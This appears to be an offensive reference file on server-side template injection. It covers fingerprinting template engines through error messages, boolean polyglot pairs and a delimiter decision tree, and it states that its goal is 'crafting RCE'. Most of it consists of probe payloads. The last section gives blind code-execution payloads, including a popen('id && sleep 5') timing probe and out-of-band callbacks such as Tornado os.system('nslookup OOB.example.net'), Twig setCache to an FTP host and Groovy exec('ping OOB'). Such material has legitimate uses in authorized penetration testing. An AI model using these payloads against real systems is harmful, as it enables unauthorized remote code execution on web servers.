# Engine fingerprinting & blind detection: error-language table, boolean polyglot pairs, syntax decision tree — Open WHEN: a sink consumes the polyglot but output is suppressed, or `{{7*7}}`/`${7*7}` both render literally and you must identify the engine before crafting RCE

The body already lists the per-syntax `7*7` probes, the differential `{{7*'7'}}`
(Jinja2 49 vs Twig 7777777), and the stack-trace engine names. This file adds
the blind/error-channel methods the body does not cover.

## Error-language table — fire `(1/0)` (or `${7/0}` / `<%=7/0%>`) inside a tag
When the engine math-divides by zero and the error is verbose, the exception
class names the LANGUAGE (narrow before per-engine probing):

| Error string in response          | Language          |
|-----------------------------------|-------------------|
| `ZeroDivisionError`               | Python            |
| `java.lang.ArithmeticException`   | Java              |
| `ReferenceError` / `TypeError`    | NodeJS            |
| `Division by zero` / `DivisionByZeroError` | PHP      |
| `divided by 0`                    | Ruby              |
| `Arithmetic operation failed`     | Freemarker (Java) |

Deeper error-channel probe (forces a verbose chained-attribute error that can
echo evaluated values): `(1/0).zxy.zxy`.

## Boolean polyglot pairs — blind sinks (no reflection, no error body)
Send each `ok`/`error` pair; if the `ok` member returns a clean response and
the `error` member changes status/length, the tag is being evaluated. Use TWO
pairs to rule out external interference:

| pair | ok (valid math)  | error (broken syntax) |
|------|------------------|-----------------------|
| 1    | `(3*4/2)`        | `3*)2(/4`             |
| 2    | `((7*8)/(2*4))`  | `7)(*)8)(2/(*4`       |

## Syntax decision tree — which delimiter does the engine parse?
Fire these in order; the first that evaluates (returns `49` not the literal)
tells you the delimiter family, then drop to the matching engine reference:
```
{{7*7}}        → 49  → Jinja2 | Twig | Nunjucks | Django(|add) | Tornado | Pebble | Handlebars-class | Go
${7*7}         → 49  → Freemarker | Velocity-via-#set | Thymeleaf/SpringEL | JSP-EL | Mako
${{7*7}}       → 49  → JSP/JSF EL (also Freemarker)
#{7*7}         → 49  → Pug/Jade | Slim | Thymeleaf(legacy) | JSF
<%= 7*7 %>     → 49  → ERB | EJS | ASP | Mojolicious(Perl)
*{7*7}         → 49  → Thymeleaf selection / SpringEL alt-delimiter
@(7*7) / @(2+2)→ 49  → Razor (.NET)   — also @ , @("x") succeed; @{ } errors
{7*7}          → 49  → Smarty-ish single-brace
```
Same-syntax disambiguation (both speak `{{ }}`):
```
{{7*'7'}}      → 49        → Jinja2/Django-family
{{7*'7'}}      → 7777777   → Twig (PHP) OR Tornado (Python)  — split by error language
{{this}} {{@root}} render → Handlebars
{{ . }} reflects struct   → Go text/template
{$smarty.version}         → Smarty (returns version string)
{{request}} → ...TemplateContextRequest@  → Jinjava / HuBL (Java)
```
Razor positive set (confirms .NET when `7*7` ambiguous): `@(2+2)` success,
`@("x")` success, but `@{` and `@{}` throw — that asymmetry is the tell.

## Blind exfiltration channels when nothing renders
- Time-based: pair a fast vs slow body and diff latency (`... popen("id && sleep 5")`, or a long `range`/loop in the engine's own syntax). Always take a no-payload baseline first.
- Out-of-band (OOB): make the engine resolve DNS / fetch a URL to a host you control — e.g. Tornado `{% import os %}{{os.system('nslookup OOB.example.net')}}`, Twig `setCache("ftp://OOB:2121")`, Groovy `... .exec("ping OOB")`. A received callback confirms code execution even with zero response body.
